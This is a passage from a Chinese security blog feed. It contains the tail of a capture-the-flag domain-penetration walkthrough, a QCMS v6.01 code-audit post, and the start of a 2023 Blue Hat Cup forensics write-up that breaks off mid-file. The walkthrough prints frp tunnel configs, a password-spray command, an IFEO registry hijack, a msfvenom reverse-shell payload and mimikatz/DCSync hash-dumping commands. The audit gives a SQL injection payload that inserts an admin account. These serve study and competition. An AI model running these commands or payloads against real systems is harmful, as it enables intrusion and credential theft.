alt="image">​</p><p>我们注入一个john进程：</p><p>​<img src="/Blogimages/Tsclient/image-20231021161735-iclmmei.png" alt="image">​</p><p>上线一个新的用户：</p><p>​<img src="/Blogimages/Tsclient/image-20231021163048-nhcmbrp.png" alt="image">​</p><p>使用<code>shell net use</code>​</p><p>​<img src="/Blogimages/Tsclient/image-20231021163119-uobga3l.png" alt="image">​</p><p>发现他有一个连接</p><p>拿文件：</p><p>​<img src="/Blogimages/Tsclient/image-20231021163241-4kf8zof.png" alt="image">​</p><p>发现有一个密码账号（这里还有一个提示没看见。。。，原话是：</p><p>​<img src="/Blogimages/Tsclient/image-20231021211601-tx461b7.png" alt="image">​</p><p>而且是在域内的，我们挂个代理进去看看：</p><p>frpc配置文件如下：</p><pre class=" language-xml"><code class="language-xml">[common]server_addr = vps_ipserver_port = 7000token = xxxx[proxy]type = tcpplugin = socks5remote_port = 25599</code></pre><p>frps配置文件如下：</p><pre class=" language-xml"><code class="language-xml">[common]## 一、服务器的基本配置部分## 7000 是FRP服务端口，可以改bind_port = 7000## dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。dashboard_user = admindashboard_pwd = xxxx## 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆dashboard_port = 25500## 服务器和客户机之间的心跳连接heartbeat_timeout = 30#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求token=xxxx</code></pre><p>修改Klai的proxychains配置文件</p><p>​<img src="/Blogimages/Tsclient/image-20231021163847-e3djmvt.png" alt="image">​</p><p>访问确认代理可以使用</p><p>​<img src="/Blogimages/Tsclient/image-20231021163825-jt2p8i5.png" alt="image">​  </p><p>关于代理更细的代理都写在<a href="http://qingfeng.tech/2023/06/06/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/">内网代理 | 清风的博客 (qingfeng.tech)</a></p><p>利用密码喷洒探测内网可以使用该密码登录的主机：</p><pre class=" language-shell"><code class="language-shell">proxychains -q crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'</code></pre><p>​<img src="/Blogimages/Tsclient/image-20231021164123-1jzpvai.png" alt="image">​</p><p>​<img src="/Blogimages/Tsclient/image-20231021164105-6gmmso7.png" alt="image"></p><p>提示密码状态已过期</p><p>​<img src="/Blogimages/Tsclient/image-20231021165206-l4ni1h8.png" alt="image">​</p><p>重置密码，31，15，46三台机子只有15可以重置成功</p><p>但是奇怪的是15无法登录，但是46却可以登录，而且也是修改完密码的。表示不解..</p><p>现在利用rdp登录：</p><pre class=" language-shell"><code class="language-shell">proxychains rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p 'qwer1234!'proxychains rdesktop 172.22.8.15 -u Aldrich -d xiaorang.lab -p 'qwer1234!'proxychains rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'qwer1234!' -r disk:Linuxictures=/home/kali/Desktop  # 只有这个46可以登录成功  -r 是因为为了后续方便传输文件，挂载了一个虚拟磁盘名为Linuxictures，在RDP的资源管理器中可以看见</code></pre><p>现在的46就是一个普通用户，想要flag必须提权到Administrator权限以上</p><p>这里就利用到了上面的提示</p><p>​<img src="/Blogimages/Tsclient/image-20231021211935-ejhcsfc.png" alt="image">​</p><p>​<code>你知道映像劫持吗？</code>​</p><p>Image File Execution Options（IFEO）是映像劫持的英文，就是在执行某个程序时拦截并执行自己定义的程序。</p><p>配合后门持久化,可以实现系统在未登录状态下，通过快捷键运行自己的程序。（比如按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序）</p><p>更多如下</p><ul><li>屏幕键盘： C:\Windows\System32\osk.exe</li><li>放大镜： C:\Windows\System32\Magnify.exe</li><li>旁白： C:\Windows\System32\Narrator.exe</li><li>显示切换器 C:\Windows\System32\DisplaySwitch.exe</li></ul><p>打开Powershell输入命令可以看是否存在这个漏洞：</p><p>​<code>get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</code>​</p><p>​<img src="/Blogimages/Tsclient/image-20231021213145-m37y3vh.png" alt="image">​</p><pre class=" language-xml"><code class="language-xml">1. NT AUTHORITY\Authenticated Users Allow SetValue,CreateSubKey,ReadKey: 这个规则允许"Authenticated Users"用户组执行 "SetValue" 和 "CreateSubKey" 操作，这两个操作都可以用来修改注册表的内容。2. APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow SetValue,CreateSubKey,ReadKey: 这个规则允许"ALL APPLICATION PACKAGES"权限组执行 "SetValue" 和 "CreateSubKey" 操作，同样，这两个操作都可以用来修改注册表。这意味着任何已认证的用户（"Authenticated Users"）和所有应用程序包权限组（"ALL APPLICATION PACKAGES"）的成员都可以对注册表进行修改，包括添加、修改和删除注册表键和值。</code></pre><p>所以我们可以通过普通用户修改注册表：</p><pre class=" language-xml"><code class="language-xml">REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"</code></pre><p>修改成功后，锁定用户，右下角点击放大镜。弹出cmd表示成功劫持，读取flag即可</p><p>​<img src="/Blogimages/Tsclient/image-20231021190943-2aup7jo.png" alt="image">​</p><p>‍</p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来就是考虑如何拿到域控了</p><p>先上线我们上面提权到的机器（Administrator执行上线）</p><p>‍</p><p>这里上线的时候有个问题，这台机器是不出网的</p><p>想要上线CS，必须通过入口机作为跳板</p><p>​<img src="/Blogimages/Tsclient/image-20231021215545-nznv0tu.png" alt="image">​</p><p>入口机器选择这个Lintener作为中转机</p><p>​<img src="/Blogimages/Tsclient/image-20231021215621-2o9yef0.png" alt="image">​</p><p>这里就是建立了一个监听</p><p>再选择木马：</p><p>​<img src="/Blogimages/Tsclient/image-20231021215707-vg5mor7.png" alt="image">​</p><p>这里是Stageless木马才能选中Lintener监听</p><p>之后执行即可上线</p><p>这里还有另一个问题，因为我vps上面没有MSF，如果想要上线我Kali的MSF应该怎么做（上线MSF为了提权，虽然没提上）</p><p>就是上面说到的问题：</p><p>​​<img src="/Blogimages/Tsclient/image-20231021220617-ds2qjtj.png" alt="image">​​</p><p>毫无疑问我们是利用线路1</p><p>首先需要以39.99.224.53作为FRPS</p><p>frps.ini如下：</p><pre class=" language-xml"><code class="language-xml">[common]bind_port = 7001token=frpToken@admin2022</code></pre><p>kali作为frpc</p><p>frpc.ini如下:</p><pre class=" language-xml"><code class="language-xml">[common]server_addr = 39.99.224.53server_port = 7001token = frpToken@admin2022[proxy]type = tcplocal_ip = 192.168.120.128local_port = 9999remote_port = 9999</code></pre><p>接下来的问题就是生成木马了</p><pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.8.18  LPORT=9999 -f exe > muma.exe</code></pre><p>这里为什么选择LHOST&#x3D;172.22.8.18呢？</p><p>因为我们使用frp已经把172.22.8.18（39.99.224.53）的9999端口转发到kali的9999端口了，并且172.22.8.46只能访问到172.22.8.18（39.99.224.53）的9999端口</p><p>所以就相当于我们msf的9999端口就在172.22.8.18（39.99.224.53）的9999端口</p><p>但是上线MSF仍然没有可以利用的提权…</p><p>回到flag3</p><p>这台主机已经是在域内了，所以我们可以直接看域内的管理员用户</p><p>​<code>shell net group &quot;domain admins&quot; /domain</code>​</p><p>​<img src="/Blogimages/Tsclient/image-20231021213551-7wmwwkm.png" alt="image">​</p><p>可以看到这里有两个用户：</p><pre class=" language-xml"><code class="language-xml">AdministratorWin2016$(机器用户)</code></pre><p>Administrator是DC上的账户，我们没有权限直接抓到他</p><p>‍</p><p>但是我们可以抓到WIN2016的NTLM：</p><p>​<img src="/Blogimages/Tsclient/image-20231021214720-9wfcf14.png" alt="image">​</p><p>​<img src="/Blogimages/Tsclient/image-20231021191911-8advxds.png" alt="image">​</p><p>利用这个NTLM：</p><p>​<img src="/Blogimages/Tsclient/image-20231021214528-1dk7xrg.png" alt="image">​</p><p>首先提到<code>WIN2016</code>​的权限</p><p>然后抓取Administrator的NTLM值：</p><p>​<code>mimikatz lsadump::dcsync /domain:xiaorang.lab /all /csv exit</code>​</p><p>​<img src="/Blogimages/Tsclient/image-20231021214927-0tt5j6y.png" alt="image">​</p><p>再次利用Administrator的NTLM建立连接</p><p>先切换任务视图</p><p>​<img src="/Blogimages/Tsclient/image-20231021215025-lr4naan.png" alt="image"></p><p>再选择64位的pkexec横向：</p><p>​<img src="/Blogimages/Tsclient/image-20231021215115-ly09kda.png" alt="image">​</p><p>选择好使用的hash值</p><p>​<img src="/Blogimages/Tsclient/image-20231021215149-3yevwo8.png" alt="image">​</p><p>再确定好Listener和Session，成功后会返回一个标识</p><p>​<img src="/Blogimages/Tsclient/image-20231021215231-li4861l.png" alt="image">​</p><p>再利用<code>dcsync</code>​抓到<code>Administrator</code>​的账号</p><p>读取flag</p><p>​<img src="/Blogimages/Tsclient/image-20231021211111-1z28wol.png" alt="image"></p><p>关于这里的<code>dcsync</code>​也有必要说一下</p><blockquote><h3 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h3><p><strong>一个域环境内可以拥有多台域控制器，每个域控制器各自存储着一份所在域的活动目录的可写副本，对目录的任何修改都可以从源控制器同步到本域、域树和域林中的其他域控制器上，当一个域控想从另一个域控获取域数据更新时，客户端域控会向服务端域控发送DSGetNCChanges请求，该请求的响应将包含客户段域控必须应用到其活动目录副本的一组更新。通常情况下，域控制器之间每15分组就会有一次域数据同步。</strong></p><p><strong>DCSync技术就是利用域控制器同步的原理，通过Directory Replication Service(DRS)服务的IDL_DRSGetNCChanges接口向域控发起数据通过请求。在DCSync出现前，要获得所有域用户的哈希，测试人员可能需要登录域控制器或通过卷影拷贝技术获取NTDS.dit文件。利用DCSync，测试人员可以在域内任何一台机器上模拟一个域控制器，通过域数据同步复制的方式获取正在运行的合法域控制器上的数据。注意，DCSync攻击不适用于只读域控制器（RODC）。</strong></p><p><strong>在默认情况下，只有Administrator，Domain Controllers和Enterprise Domain Admins组内的用户和域控制器的机器账户才有执行DCSync操作的权限。</strong></p><p>‍</p><p><strong>一般来说，域管理员权限的用户以及Krbtgt用户的哈希是有价值的。通过域管理员的哈希可以直接获取服务器控制权，而Krbtgt用户的哈希可以用来制作黄金票据，实现票据传递攻击。拿到域控权限导出全部hash，就可以直接PTH攻击域内所有机器了。</strong></p><pre><code>                                                            --  xiaoqiuxx</code></pre></blockquote><p>实现途径：</p><h4 id="猕猴桃"><a href="#猕猴桃" class="headerlink" title="猕猴桃"></a>猕猴桃</h4><pre class=" language-xml"><code class="language-xml"># 导出域内指定用户的信息(包括哈希值)mimikatz.exe "lsadump::dcsync /domain:whoamianony.org /user:administrator" exitmimikatz.exe "lsadump::dcsync /domain:whoamianony.org /user:administrator /csv" exit# 导出域内所有用户的信息(包括哈希值)mimikatz.exe "lsadump::dcsync /domain:whoamianony.org /all" exitmimikatz.exe "lsadump::dcsync /domain:whoamianony.org /all /csv" exit</code></pre><h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><pre class=" language-xml"><code class="language-xml">#导出域管理员Administrator用户的哈希值python3 secretsdump.py whoamianony/administrator:Whoami2021@192.168.93.30 -dc-ip 192.168.93.30 -just-dc-user administrator    # 获取 administrator 用户的哈希# python3 secretsdump.py domain/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">for</span> <span class="token attr-name">DCSync</span><span class="token punctuation">></span></span>:password@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dc-ip</span><span class="token punctuation">></span></span> -dc-ip <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dc-ip</span><span class="token punctuation">></span></span> -just-dc-user <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span> <span class="token attr-name">for</span> <span class="token attr-name">DCSync</span><span class="token punctuation">></span></span></code></pre><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><pre class=" language-xml"><code class="language-xml">Import-Module .\Invoke-DCSync.ps1​# 导出域内所有用户的哈希值Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize​# 导出域内指定用户的哈希值Invoke-DCSync -DumpForest | ft -wrap -autosize</code></pre><p>‍</p><p>最终的结果图：</p><p>​<img src="/Blogimages/Tsclient/image-20231021230102-0shmu2m.png" alt="image">​</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>QCMS_v6.01</title>
      <link href="/2023/10/03/QCMS_v6.01/"/>
      <url>/2023/10/03/QCMS_v6.01/</url>
      
        <content type="html"><![CDATA[<h1 id="QCMS-v6-01"><a href="#QCMS-v6-01" class="headerlink" title="QCMS_v6.01"></a>QCMS_v6.01</h1><p>源码如下：</p><p><a href="https://bbs.q-cms.cn/detail/8.html">QCMS V6.0.1 正式版发布——QCMS官方交流论坛 (q-cms.cn)</a></p><h2 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h2><p>流程如下：</p><p>在输入框里面输一个1，进入源码调试：</p><p>路由：<strong>System&#x2F;Controller&#x2F;index.php</strong></p><p>在serach地方下断点：</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517190623-q2emtja.png" alt="image">​</p><p>然后我们跟进调试，最后在loop的地方找到sql利用点：</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517190856-2j3xino.png" alt="image">​</p><p>这里有个正则要过：</p><pre class=" language-xml"><code class="language-xml">/{{loop([\s\S.]*?)}}([\s\S.]*?){{\/loop}}/i</code></pre><p>匹配很简单</p><pre class=" language-xml"><code class="language-xml">{{loop}}a{{/loop}}</code></pre><p>并且这里要匹配的是$Matches[1]</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517191025-pj8v8sn.png" alt="image">​</p><p>所以就要控制</p><pre class=" language-xml"><code class="language-xml">{{loop(要控制的地方)}}a{{/loop}}</code></pre><p>‍</p><p>并且下面还有一句$Para[‘sql’],所以要控制这个地方是</p><pre class=" language-xml"><code class="language-xml">{{loopsql}}a{{/loop}}</code></pre><p>进入<code>self::_getKv($v)</code>​</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517191503-o34dp04.png" alt="image">​</p><p>发现还有一个正则</p><pre class=" language-xml"><code class="language-xml">/([\w]*?)=\'([\w\W]*?)\'/i</code></pre><p>这里是形式就是sql&#x3D;’xxx’了</p><p>我们传参</p><pre class=" language-xml"><code class="language-xml">{{loopsql=''xxx}}a{{/loop}}</code></pre><p>这样子就返回sql&#x3D;’xxx’了</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517191653-e4onphr.png" alt="image">​</p><p>‍</p><p>我们从<code>$Replace[] = self::_replaceLoop($Para[&#39;sql&#39;], $Matches[2][$k], &#39;Loop_&#39;);</code>​一路跟进去</p><pre class=" language-xml"><code class="language-xml">Db.php:66, Model\QC_Sys_model->query()Controllers.php:760, Index->_replaceLoop()Controllers.php:660, Index->loop_Tmp()Controllers.php:57, Index->tempRun()index.php:32, Index->search_Action()Base.php:236, Base::InsertFuncArray()Router.php:97, Router->ViewController()Router.php:22, Router->__construct()Router.php:25, Router::get_instance()X.php:27, require()index.php:29, {main}()</code></pre><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517192004-ufhk7j5.png" alt="image">​</p><p>发现这里直接对传入进去的xx执行了，那么sql注入就来了</p><pre class=" language-xml"><code class="language-xml">{{loopsql='select sleep(1)'}}{{/loop}}</code></pre><p>危害证明：</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20231003192019-t5dzdb0.png" alt="image">​</p><p>输入延时语句查询，发现这里延时了7s，因为</p><pre class=" language-php"><code class="language-php">        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$Para</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">_getKv</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$Para</span><span class="token punctuation">[</span><span class="token string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span>             <span class="token variable">$Search</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$Replace</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">_replaceLoop</span><span class="token punctuation">(</span><span class="token variable">$Para</span><span class="token punctuation">[</span><span class="token string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'Loop_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>这一句会导致sleep多次执行，所以会导致延迟七秒</p><p>如果我们把sleep的时间换成2：</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20231003192337-ytm3jqx.png" alt="image">​</p><p>而且我们在sql的执行日志中也可以看到sleep(2)执行了7次</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20231003192326-zl735j8.png" alt="image">​</p><p>这里就可以修改数据库的密码了：</p><pre class=" language-xml"><code class="language-xml">{{loopsql='INSERT INTO qc_user (UserId, Phone, NickName, Head, Password, Name, Address, Sex, Mail, MailCheck, Money, Coins, State, TsAdd, IpAdd, GroupUserId, GroupAdminId, IsAdmin, TsLast, IpLast) VALUES (999, "18898765432", "管理员", "", "e10adc3949ba59abbe56e057f20f883e", "", "", 1, "", 2, 0.00, 0, 1, 1684310395, "127.0.0.1", 1, 1, 1, 1684310876, "127.0.0.1");'}}a{{/loop}}</code></pre><p>‍</p><h2 id="后台任意文件读取"><a href="#后台任意文件读取" class="headerlink" title="后台任意文件读取"></a>后台任意文件读取</h2><p>进入后台有一个任意文件读取，这个就比较简单了，直接用Seay就可以审计出来了</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517192321-yofy91h.png" alt="image">​</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517192355-r3fjmse.png" alt="image"></p><p>根目录编辑一个test.txt</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517192750-4a4n7zc.png" alt="image">​</p><p>目录穿越读取文件：</p><p>​<img src="/Blogimages/QCMS_v6.01/image-20230517192626-vba6zdo.png" alt="image">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023蓝帽杯半决赛</title>
      <link href="/2023/09/19/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
      <url>/2023/09/19/2023%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>​<img src="/Blogimages/2023bluehatcup/image-20230917130441-k2sofly.png" alt="image">​</p><p>先贴排名（狗头），师傅们北京见！</p><p>感觉这次比赛的提升算是蛮大的，但是又一次遇到了侧信道，后面跑侧信道的时候是真恶心…因为总共似乎只有两个端口，这就意味着这个算是一个公共靶机，侧信道最怕的就是干扰了，后台机器人搞得点赞速度慢的离谱捏。最初我拿秒表测试的时候是15s，到后面sleep设置到30s都会出错</p><p>大家都争破了脑袋在这挤，要么就是有脏东西搞ddos</p><p>先说取证WP吧</p><p>取题密码：2023@QAX#LMB*PGS-9.16</p><h3 id="取证"><a href="#取证" class="headerlink" title="取证"></a>取证</h3><h4 id="1-检材数据开始提取是今年什么时候？（答案格式：04-12-13-26）"><a href="#1-检材数据开始提取是今年什么时候？（答案格式：04-12-13-26）" class="headerlink" title="1.检材数据开始提取是今年什么时候？（答案格式：04-12 13:26）"></a>1.检材数据开始提取是今年什么时候？（答案格式：04-12 13:26）</h4><p>​<img src="/Blogimages/2023bluehatcup/image-20230917131508-tbyub7x.png" alt="image">​</p><p>打开这个log文件</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917131526-clgh6b9.png" alt="image">​</p><p>按照题目要求，任务开始应该就是如图所示的了</p><h4 id="2-嫌疑人手机SD卡存储空间一共多少GB？（答案格式：-22-5）"><a href="#2-嫌疑人手机SD卡存储空间一共多少GB？（答案格式：-22-5）" class="headerlink" title="2.嫌疑人手机SD卡存储空间一共多少GB？（答案格式： 22.5）"></a>2.嫌疑人手机SD卡存储空间一共多少GB？（答案格式： 22.5）</h4><p>如图<img src="/Blogimages/2023bluehatcup/image-20230917131654-g9tex8n.png" alt="image">​</p><p>就是这个24.32GB了</p><h4 id="3-嫌疑人手机设备名称是？（答案格式：adfer）"><a href="#3-嫌疑人手机设备名称是？（答案格式：adfer）" class="headerlink" title="3.嫌疑人手机设备名称是？（答案格式：adfer）"></a>3.嫌疑人手机设备名称是？（答案格式：adfer）</h4><p>​<img src="/Blogimages/2023bluehatcup/image-20230917131815-lrig48g.png" alt="image">​</p><p>前面都是送分题，没啥好说的</p><h4 id="4-嫌疑人手机IMEI是？（答案格式：3843487568726387）"><a href="#4-嫌疑人手机IMEI是？（答案格式：3843487568726387）" class="headerlink" title="4.嫌疑人手机IMEI是？（答案格式：3843487568726387）"></a>4.嫌疑人手机IMEI是？（答案格式：3843487568726387）</h4><p>​<img src="/Blogimages/2023bluehatcup/image-20230917131852-s3jqxkc.png" alt="image">​</p><p>送分</p><h4 id="5-嫌疑人手机通讯录数据存放在那个数据库文件中？（答案格式：call-db）"><a href="#5-嫌疑人手机通讯录数据存放在那个数据库文件中？（答案格式：call-db）" class="headerlink" title="5.嫌疑人手机通讯录数据存放在那个数据库文件中？（答案格式：call.db）"></a>5.嫌疑人手机通讯录数据存放在那个数据库文件中？（答案格式：call.db）</h4><p>​<img src="/Blogimages/2023bluehatcup/image-20230917131928-217s11d.png" alt="image">​</p><p>送分</p><h4 id="6-嫌疑人手机一共使用过多少个应用？（答案格式：22）"><a href="#6-嫌疑人手机一共使用过多少个应用？（答案格式：22）" class="headerlink" title="6.嫌疑人手机一共使用过多少个应用？（答案格式：22）"></a>6.嫌疑人手机一共使用过多少个应用？（答案格式：22）</h4><p>这题是比较有争议的一题吧，最终还是填了206，理由是这是第六题，别绕弯子是送分题，因为第七题也是送分的</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917132123-kq7c4tm.png" alt="image">​</p><h4 id="7-测试apk的包名是？（答案格式：con-tencent-com）"><a href="#7-测试apk的包名是？（答案格式：con-tencent-com）" class="headerlink" title="7.测试apk的包名是？（答案格式：con.tencent.com）"></a>7.测试apk的包名是？（答案格式：con.tencent.com）</h4><p>这一题就有点需要联系题干了我觉得</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917132304-3nbrbdr.png" alt="image">​</p><p>题目描述说是这个测试软件可以保存短信记录和通话</p><p>所以对应的apk的包中要有这样的功能</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917132416-pkqdhg2.png" alt="image">​</p><p>然后找的话第一眼肯定是这个example啊，没道理先看其他的，因为这个看名字也最像</p><p>可以jadx看看</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917132601-wx7splo.png" alt="image">​</p><p>这下没得跑了，保存短信和写文件，可以确定这个就是测试软件了</p><p>包名：</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917132928-1x1i55a.png" alt="image">​</p><p>包名如上图</p><h4 id="8-测试apk的签名算法是？（答案格式-AES250）"><a href="#8-测试apk的签名算法是？（答案格式-AES250）" class="headerlink" title="8.测试apk的签名算法是？（答案格式:AES250）"></a>8.测试apk的签名算法是？（答案格式:AES250）</h4><p>签名算法这里有个小坑</p><p>jadx中是</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917132714-f9kcg5h.png" alt="image">​</p><p>SHA256withRSA</p><p>雷电中是SHA256-RSA</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917132756-jd6504o.png" alt="image">​</p><p>正确答案就是SHA256withRSA（感谢上天眷顾我）</p><h4 id="9-测试apk的主入口是？（答案格式：com-tmp-mainactivity）"><a href="#9-测试apk的主入口是？（答案格式：com-tmp-mainactivity）" class="headerlink" title="9.测试apk的主入口是？（答案格式：com.tmp.mainactivity）"></a>9.测试apk的主入口是？（答案格式：com.tmp.mainactivity）</h4><p>​<img src="/Blogimages/2023bluehatcup/image-20230917132636-6blz32w.png" alt="image">​</p><h4 id="10-测试apk一共申请了几个权限？（答案格式：7）"><a href="#10-测试apk一共申请了几个权限？（答案格式：7）" class="headerlink" title="10.测试apk一共申请了几个权限？（答案格式：7）"></a>10.测试apk一共申请了几个权限？（答案格式：7）</h4><p>这题似乎是三个，我是填了两个</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917195424-pb3h7jz.png" alt="image">​</p><p>这两个是一样的</p><p>但是可以注意到PERMISSION，所以我默认他没有获取….</p><p>答案是三个</p><h4 id="11-测试apk对Calllog-txt文件内的数据进行了什么加密？（答案格式：DES）"><a href="#11-测试apk对Calllog-txt文件内的数据进行了什么加密？（答案格式：DES）" class="headerlink" title="11.测试apk对Calllog.txt文件内的数据进行了什么加密？（答案格式：DES）"></a>11.测试apk对Calllog.txt文件内的数据进行了什么加密？（答案格式：DES）</h4><p>​<img src="/Blogimages/2023bluehatcup/image-20230917200158-3yqkegl.png" alt="image">​</p><p>这里比较坑的是答案是base64不是Base64，差评</p><h4 id="12-10086对嫌疑人拨打过几次电话？（答案格式：5）"><a href="#12-10086对嫌疑人拨打过几次电话？（答案格式：5）" class="headerlink" title="12.10086对嫌疑人拨打过几次电话？（答案格式：5）"></a>12.10086对嫌疑人拨打过几次电话？（答案格式：5）</h4><p>首先10086这种电话，肯定尝试找文件了，因为他给删除过，不是搜tel就是搜sms</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917133210-gd7rrds.png" alt="image">​</p><p>发现sms是找到了</p><p>​<img src="/Blogimages/2023bluehatcup/image-20230917133246-3xhnp78.png" alt="image">​</p><p>然后可以在同目录下找到calllog.txt，这个肯定就是通话记录了，内容如下：</p><pre class=" language-txt"><code class="language-txt">TnVtYmVyOiArODYxODE4MTkyMjg2NywgVHlwZTog5ZG86L+bLCBEYXRlOiBUaHUgQXVnIDE5IDE3OjQxOjQ4IEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjE4MTgxOTIyODY3LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTc6NDg6NDUgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTgxODE5MjI4NjcsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNzo0NTo0NiBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxODE4MTkyMjg2NywgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE3OjQ1OjI0IEdNVCswODowMCAyMDIxCk51bWJlcjogKzg2MTgxODE5MjI4NjcsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNzo0NDo0OCBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxODE4MTkyMjg2NywgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE3OjQzOjQ2IEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjE4MTgxOTIyODY3LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTc6NDI6MTQgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTgxODE5MjI4NjcsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNzo0MTozMyBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDE4MTgxOTIyODY3LCBUeXBlOiDlkbzlh7osIERhdGU6IFR1ZSBBdWcgMTcgMTc6Mzg6MDAgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTgxODE5MjI4NjcsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNzozNjoxNiBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEYXRlOiBUdWUgQXVnIDE3IDE3OjM1OjIwIEdNVCswODowMCAyMDIxCk51bWJlcjogMDA4NjEyMzM2NTU1LCBUeXBlOiDlkbzov5ssIERhdGU6IFR1ZSBBdWcgMTcgMTc6MzM6MDIgR01UKzA4OjAwIDIwMjEKTnVtYmVyOiAwMDg2MTIzMzY1NTUsIFR5cGU6IOWRvOi/mywgRGF0ZTogVHVlIEF1ZyAxNyAxNzozMjo1MCBHTVQrMDg6MDAgMjAyMQpOdW1iZXI6IDAwODYxMjMzNjU1NSwgVHlwZTog5ZG86L+bLCBEY